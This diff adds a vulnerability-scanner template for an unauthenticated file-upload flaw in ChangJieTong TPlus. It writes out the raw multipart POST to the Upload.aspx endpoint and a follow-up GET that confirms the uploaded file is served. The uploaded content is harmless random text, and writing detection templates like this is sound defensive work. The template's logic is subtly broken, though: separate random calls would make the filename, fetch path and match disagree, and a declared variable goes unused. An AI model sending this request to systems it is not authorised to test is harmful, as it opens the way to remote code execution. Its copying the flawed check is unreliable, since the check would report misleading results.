@@ -1,0 +1,45 @@
+id: changjietong-tplus-upload-file-execution
+info:
+  name: ChangJieTong TPlus Upload.aspx Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    ChangJieTong TPlus Upload.aspx allows unauthenticated users to upload arbitrary files, leading to remote code execution.
+  classification:
+    cvss-score: 10.0
+  tags: file-upload, rce
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------Hutool_974onfqddru1yme6
+
+        ----------------------Hutool_974onfqddru1yme6
+        Content-Disposition: form-data; name="File1"; filename="{{rand_text_alphanumeric(8)}}.jpg"
+        Content-Type: image/jpeg
+
+        {{rand_text_alphanumeric(8)}}
+        ----------------------Hutool_974onfqddru1yme6--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "submitPic()"
+  - raw:
+      - |
+        GET /tplus/{{rand_text_alphanumeric(8)}}.jpg HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{rand_text_alphanumeric(8)}}"
+variables:
+  rand_text_alphanumeric_8: '{{rand_text_alphanumeric(8)}}'
